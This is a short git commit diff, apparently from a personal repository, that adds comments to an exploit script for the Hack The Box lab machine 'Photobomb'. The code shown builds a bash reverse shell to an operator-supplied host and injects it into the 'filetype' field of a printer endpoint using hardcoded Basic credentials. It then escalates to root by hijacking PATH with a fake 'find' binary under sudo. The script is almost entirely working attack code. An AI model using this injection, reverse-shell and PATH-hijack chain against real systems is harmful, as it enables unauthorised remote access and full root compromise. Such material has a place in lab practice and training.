7f0b270ed3a3f57d8d23c5f727af9b642e72dbac
akhils911dev <dev.akhils911@gmail.com>
2022-10-18 16:05:18 +0530

    A remote single script for RCE to ROOT

--- photobomb/photobomb-pwn.py
+++ photobomb/photobomb-pwn.py
@@ -1,6 +1,7 @@
 import sys
 import requests
 
+# Making of reverse-shell
 def rce(ip,port):
 	reverse_shell = "bash -i >& /dev/tcp/"+ ip + "/"+ port + " 0>&1"
 	command = "/home/wizard/find | chmod +x /home/wizard/find | sudo PATH=/home/wizard:$PATH /opt/cleanup.sh"
@@ -9,6 +10,7 @@ def rce(ip,port):
 
 pwn = rce(sys.argv[1],sys.argv[2])
 
+# Request for inject the command
 url = "http://photobomb.htb/printer"
 header = {"Authorization": "Basic cEgwdDA6YjBNYiE="}
 data = {"photo":"finn-whelen-DTfhsDIWNSg-unsplash.jpg","filetype":"jpg;"+pwn,"dimensions":"3000x2000"}
